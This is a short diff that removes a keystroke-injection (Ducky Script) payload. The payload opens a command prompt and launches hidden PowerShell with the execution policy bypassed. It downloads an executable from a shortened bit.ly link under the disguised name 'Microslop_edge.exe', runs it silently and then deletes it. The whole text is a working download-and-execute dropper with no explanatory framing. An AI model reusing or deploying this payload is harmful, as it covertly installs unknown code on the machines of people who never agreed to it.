@@ -1,9 +1,0 @@
-DEFAULTCHARDELAY 0
-DEFAULTDELAY 0
-GUI r
-DELAY 300
-STRING cmd 
-ENTER
-DELAY 200
-STRING powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference = 'SilentlyContinue'; $S = Join-Path $env:USERPROFILE 'AppData\Local\Temp\Microslop_edge.exe'; iwr https://bit.ly/4ykL04g -OutFile $S; Start-Process -FilePath $S -WindowStyle Hidden -Wait; Remove-Item -Path $S -Force"
-ENTER
